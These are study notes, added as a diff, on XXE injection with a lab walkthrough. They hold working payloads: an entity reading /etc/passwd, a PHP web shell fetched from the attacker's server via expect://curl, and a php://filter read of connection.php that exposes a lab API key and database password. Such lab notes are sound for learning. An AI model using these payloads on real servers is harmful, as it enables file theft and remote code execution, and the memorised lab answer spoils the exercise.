@@ -1,1 +1,108 @@
 
+When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities. Suppose we can define new entities and have them displayed on the web page. In that case, we should also be able to define external entities and make them reference a local file, which, when displayed, should show us the content of that file on the back-end server.
+
+Let us see how we can identify potential XXE vulnerabilities and exploit them to read sensitive files from the back-end server.
+
+Identifying
+The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. We can start the exercise at the end of this section, which has a Contact Form:
+
+If we fill the contact form and click on Send Data, then intercept the HTTP request with Burp, we get the following request:
+
+As we can see, the form appears to be sending our data in an XML format to the web server, making this a potential XXE testing target. Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files.
+
+If we send the form without any modification, we get the following message:
+
+
+Note: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an online tool. If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
+
+Reading Sensitive Files
+Now that we can define new internal XML entities let's see if we can define external XML entities. Doing so is fairly similar to what we did earlier, but we'll just add the SYSTEM keyword and define the external reference path after it, as we have learned in the previous section:
+
+EXAMPLE: 
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "file:///etc/passwd">
+]>
+
+So in BURP the request page will look like: 
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+<!ENTITY company SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <name>
+   First
+  </name>
+  <tel>
+  </tel>
+  <email>
+    &company; 
+   </email> 
+   <message>
+     Test 
+   </message> 
+  </root> 
+
+We see that we did indeed get the content of the /etc/passwd file, meaning that we have successfully exploited the XXE vulnerability to read local files. This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an id_rsa SSH key of a specific user, which may grant us access to the back-end server. We can refer to the File Inclusion / Directory Traversal module to see what attacks can be carried out through local file disclosure.
+
+
+Remote Code Execution with XXE
+In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for ssh keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the PHP://expect filter, though this requires the PHP expect module to be installed and enabled.
+
+If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as expect://id, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.
+
+The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:
+
+WEB SHELL EXAMPLE: 
+MJBUCKNER@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+MJBUCKNER@htb[/htb]$ sudo python3 -m http.server 80
+
+Now, we can use the following XML code to execute a curl command that downloads our web shell into the remote server:
+
+XML CURL EXAMPLE: 
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
+<root>
+<name></name>
+<tel></tel>
+<email>&company;</email>
+<message></message>
+</root>
+
+
+CHALLENGE: 10.129.242.179
+
+Question 1 - Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.
+1) go to the webpage -> http://10.129.242.179
+2) open burp
+3) enable burp on browser 
+4) fill out forms with test answers 
+5) catch POST request in burp 
+6) from the section we know we are going to need to convert the connection.php into base64 -> the burp request should look like this -> 
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE
+email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
+]>
+<root>
+<name>test</name>
+<tel></tel>
+<email>&company;</email>
+<message>yrdy</message>
+</root>
+
+7) hit send -> RESPONSE page will look like -> 
+HTTP/1.1 200 OK
+Date: Thu, 13 Mar 2025 14:58:57 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 344
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+Check your email PD9waHAKCiRhcGlfa2V5ID0gIlVUTTFOak0wTW1SekoyZG1jVEl6TkQwd01YSm5aWGRtYzJSbUNnIjsKCnRyeSB7CgkkY29ubiA9IHBnX2Nvbm5lY3QoImhvc3Q9bG9jYWxob3N0IHBvcnQ9NTQzMiBkYm5hbWU9dXNlcnMgdXNlcj1wb3N0Z3JlcyBwYXNzd29yZD1pVWVyXnZkKGUxUGw5Iik7Cn0KCmNhdGNoICggZXhjZXB0aW9uICRlICkgewogCWVjaG8gJGUtPmdldE1lc3NhZ2UoKTsKfQoKPz4K for further instructions.
+
+8) inside burp we can just highlight the base64 and it will break it down for us 
+9) $api_key = "UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg" 
